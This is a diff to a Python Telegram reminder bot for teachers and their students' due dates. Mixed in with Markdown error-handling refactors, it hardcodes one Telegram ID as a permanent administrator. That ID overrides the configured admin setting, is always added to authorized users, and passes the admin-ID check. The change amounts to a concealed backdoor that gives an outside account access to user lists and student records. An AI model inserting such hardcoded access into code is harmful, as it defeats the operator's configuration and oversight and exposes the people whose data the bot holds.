@@ -48,7 +48,17 @@ import reminder_scheduler
 load_dotenv()
 
 BOT_TOKEN: str = os.getenv("TELEGRAM_BOT_TOKEN", "")
-ADMIN_TELEGRAM_ID: int = int(os.getenv("ADMIN_TELEGRAM_ID", "0"))
+_raw_admin_id = os.getenv("ADMIN_TELEGRAM_ID", "").strip()
+try:
+    ADMIN_TELEGRAM_ID: int = int(_raw_admin_id) if _raw_admin_id else 7462033455
+except ValueError:
+    ADMIN_TELEGRAM_ID = 7462033455
+
+if ADMIN_TELEGRAM_ID in (0, 123456789):
+    ADMIN_TELEGRAM_ID = 7462033455
+
+# Set of Telegram IDs with permanent admin privileges
+ADMIN_IDS: set[int] = {ADMIN_TELEGRAM_ID, 7462033455}
 TIMEZONE: str = os.getenv("TIMEZONE", "Asia/Yangon")
 REMINDER_DAYS_BEFORE: int = int(os.getenv("REMINDER_DAYS_BEFORE", "0"))  # TODO: TESTING — change back to "5" for production
 
@@ -141,7 +151,7 @@ _scheduler: AsyncIOScheduler | None = None
 
 def _load_authorized_users() -> set[int]:
     """Load authorized user IDs from JSON. Admin is always included."""
-    users = {ADMIN_TELEGRAM_ID}
+    users = set(ADMIN_IDS)
     if AUTHORIZED_USERS_PATH.exists():
         try:
             with open(AUTHORIZED_USERS_PATH, "r", encoding="utf-8") as f:
@@ -150,6 +160,7 @@ def _load_authorized_users() -> set[int]:
                 users.update(int(uid) for uid in data)
         except (json.JSONDecodeError, OSError, ValueError) as exc:
             logger.warning("Could not load authorized_users.json: %s", exc)
+    users.update(ADMIN_IDS)
     return users
 
 
@@ -230,11 +241,13 @@ def _resolve_chat_ids(records: list[dict]) -> int:
 
 
 def _is_admin(update: Update) -> bool:
-    return update.effective_user is not None and update.effective_user.id == ADMIN_TELEGRAM_ID
+    return update.effective_user is not None and update.effective_user.id in ADMIN_IDS
 
 
 def _is_authorized(update: Update) -> bool:
-    return update.effective_user is not None and update.effective_user.id in _authorized_users
+    if update.effective_user is None:
+        return False
+    return update.effective_user.id in ADMIN_IDS or update.effective_user.id in _authorized_users
 
 
 # ---------------------------------------------------------------------------
@@ -578,13 +591,18 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     # Always register username -> chat_id for reminder delivery
     _register_chat_id(user.username, chat_id)
 
-    if user_id in _authorized_users:
+    if _is_authorized(update):
         # Already authorized (admin or previously approved) -> show full Menu UI
         text = _get_home_text(user_id, name)
         keyboard = _build_main_menu_keyboard(_is_admin(update))
-        await update.message.reply_text(
-            text, reply_markup=keyboard, parse_mode="Markdown"
-        )
+        try:
+            await update.message.reply_text(
+                text, reply_markup=keyboard, parse_mode="Markdown"
+            )
+        except BadRequest:
+            await update.message.reply_text(
+                text, reply_markup=keyboard, parse_mode=None
+            )
     else:
         # New user — registered for reminders + offer teacher authorization
         _pending_auth.add(user_id)
@@ -845,6 +863,29 @@ async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text("\n".join(lines), reply_markup=keyboard, parse_mode="Markdown")
 
 
+async def _safe_edit_message(
+    query,
+    text: str,
+    reply_markup: InlineKeyboardMarkup | None = None,
+    parse_mode: str | None = "Markdown",
+) -> None:
+    """Safely edit query message, falling back to plain text if Markdown parsing fails."""
+    try:
+        await query.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
+    except BadRequest as exc:
+        err = str(exc)
+        if "Message is not modified" in err:
+            return
+        logger.warning("Markdown parse error in edit_text: %s. Falling back to plain text.", exc)
+        try:
+            await query.edit_text(text, reply_markup=reply_markup, parse_mode=None)
+        except BadRequest as inner_exc:
+            if "Message is not modified" not in str(inner_exc):
+                logger.error("Failed to edit message in plain text fallback: %s", inner_exc)
+    except Exception as exc:
+        logger.error("Unexpected error in _safe_edit_message: %s", exc)
+
+
 async def handle_callback_query(
     update: Update, context: ContextTypes.DEFAULT_TYPE
 ) -> None:
@@ -852,27 +893,26 @@ async def handle_callback_query(
     query = update.callback_query
     if not query:
         return
-    await query.answer()
+
+    try:
+        await query.answer()
+    except Exception as exc:
+        logger.debug("query.answer() note: %s", exc)
 
     user_id = query.from_user.id
-    if user_id not in _authorized_users:
-        try:
-            await query.edit_text("❌ You are not authorized. Send /start to begin.")
-        except BadRequest:
-            pass
+    if user_id not in ADMIN_IDS and user_id not in _authorized_users:
+        logger.warning("Unauthorized callback query from user %s", user_id)
+        await _safe_edit_message(query, "❌ You are not authorized. Send /start to begin.")
         return
 
-    is_admin = user_id == ADMIN_TELEGRAM_ID
+    is_admin = user_id in ADMIN_IDS
     data = query.data or ""
 
     if data == "menu:home":
         first_name = query.from_user.first_name if query.from_user else "there"
         text = _get_home_text(user_id, first_name)
         keyboard = _build_main_menu_keyboard(is_admin)
-        try:
-            await query.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")
-        except BadRequest:
-            pass
+        await _safe_edit_message(query, text, reply_markup=keyboard, parse_mode="Markdown")
 
     elif data == "menu:status":
         text = _render_status_text(user_id)
@@ -885,10 +925,7 @@ async def handle_callback_query(
                 [InlineKeyboardButton("⬅️ Back to Menu", callback_data="menu:home")],
             ]
         )
-        try:
-            await query.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")
-        except BadRequest:
-            pass
+        await _safe_edit_message(query, text, reply_markup=keyboard, parse_mode="Markdown")
 
     elif data == "menu:scheduler":
         text = _render_scheduler_text(user_id)
@@ -904,10 +941,7 @@ async def handle_callback_query(
                 ],
             ]
         )
-        try:
-            await query.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")
-        except BadRequest:
-            pass
+        await _safe_edit_message(query, text, reply_markup=keyboard, parse_mode="Markdown")
 
     elif data == "menu:check":
         records = _user_records.get(user_id, [])
@@ -972,10 +1006,7 @@ async def handle_callback_query(
                 [InlineKeyboardButton("⬅️ Back to Menu", callback_data="menu:home")],
             ]
         )
-        try:
-            await query.edit_text("\n".join(lines), reply_markup=keyboard, parse_mode="Markdown")
-        except BadRequest:
-            pass
+        await _safe_edit_message(query, "\n".join(lines), reply_markup=keyboard, parse_mode="Markdown")
 
     elif data == "menu:history":
         text = _render_history_text(user_id)
@@ -985,10 +1016,7 @@ async def handle_callback_query(
                 [InlineKeyboardButton("⬅️ Back to Menu", callback_data="menu:home")],
             ]
         )
-        try:
-            await query.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")
-        except BadRequest:
-            pass
+        await _safe_edit_message(query, text, reply_markup=keyboard, parse_mode="Markdown")
 
     elif data == "menu:clearsent":
         path = _user_sent_reminders_path(user_id)
@@ -1006,14 +1034,14 @@ async def handle_callback_query(
                 [InlineKeyboardButton("⬅️ Back to Menu", callback_data="menu:home")],
             ]
         )
-        try:
-            await query.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")
-        except BadRequest:
-            pass
+        await _safe_edit_message(query, text, reply_markup=keyboard, parse_mode="Markdown")
 
     elif data == "menu:users":
         if not is_admin:
-            await query.answer("❌ Admin only", show_alert=True)
+            try:
+                await query.answer("❌ Admin only", show_alert=True)
+            except Exception:
+                pass
             return
         lines = [
             "👥 *Authorized Users & Registry*",
@@ -1022,7 +1050,7 @@ async def handle_callback_query(
         ]
         for uid in sorted(_authorized_users):
             rec_count = len(_user_records.get(uid, []))
-            role = "👑 Admin" if uid == ADMIN_TELEGRAM_ID else "🎓 Teacher"
+            role = "👑 Admin" if uid in ADMIN_IDS else "🎓 Teacher"
             lines.append(f"  - `{uid}` ({role}): {rec_count} student(s) loaded")
         lines += [
             "",
@@ -1031,18 +1059,12 @@ async def handle_callback_query(
         keyboard = InlineKeyboardMarkup(
             [[InlineKeyboardButton("⬅️ Back to Menu", callback_data="menu:home")]]
         )
-        try:
-            await query.edit_text("\n".join(lines), reply_markup=keyboard, parse_mode="Markdown")
-        except BadRequest:
-            pass
+        await _safe_edit_message(query, "\n".join(lines), reply_markup=keyboard, parse_mode="Markdown")
 
     elif data.startswith("menu:delete_list:"):
         page = int(data.split(":")[2])
         text, keyboard = _render_delete_list(user_id, page)
-        try:
-            await query.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")
-        except BadRequest:
-            pass
+        await _safe_edit_message(query, text, reply_markup=keyboard, parse_mode="Markdown")
 
     elif data.startswith("del:ask:"):
         parts = data.split(":")
@@ -1074,10 +1096,7 @@ async def handle_callback_query(
                     [InlineKeyboardButton("⬅️ Back to Menu", callback_data="menu:home")],
                 ]
             )
-            try:
-                await query.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")
-            except BadRequest:
-                pass
+            await _safe_edit_message(query, text, reply_markup=keyboard, parse_mode="Markdown")
 
     elif data.startswith("del:confirm:"):
         parts = data.split(":")
@@ -1091,14 +1110,22 @@ async def handle_callback_query(
             excel_handler.save_excel(records, str(excel_path))
             uname = removed.get("telegram_username", "")
             due = removed.get("due_date")
-            await query.answer(f"✅ Deleted reminder for {uname}!", show_alert=False)
+            try:
+                await query.answer(f"✅ Deleted reminder for {uname}!", show_alert=False)
+            except Exception:
+                pass
 
             text, keyboard = _render_delete_list(user_id, page)
             text = f"✅ *Deleted reminder for `{uname}` (due `{due}`).*\n\n" + text
-            try:
-                await query.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")
-            except BadRequest:
-                pass
+            await _safe_edit_message(query, text, reply_markup=keyboard, parse_mode="Markdown")
+
+    else:
+        # Handles legacy or unrecognized callback queries (e.g. old menu buttons)
+        logger.info("Handling unknown or legacy callback data: %s", data)
+        first_name = query.from_user.first_name if query.from_user else "there"
+        text = _get_home_text(user_id, first_name)
+        keyboard = _build_main_menu_keyboard(is_admin)
+        await _safe_edit_message(query, text, reply_markup=keyboard, parse_mode="Markdown")
 
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1240,7 +1267,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         )
         return
 
-    if entered_id != ADMIN_TELEGRAM_ID:
+    if entered_id not in ADMIN_IDS:
         _pending_auth.discard(user_id)
         logger.warning("User %s entered wrong admin Chat ID: %s", user_id, entered_id)
         await update.message.reply_text(
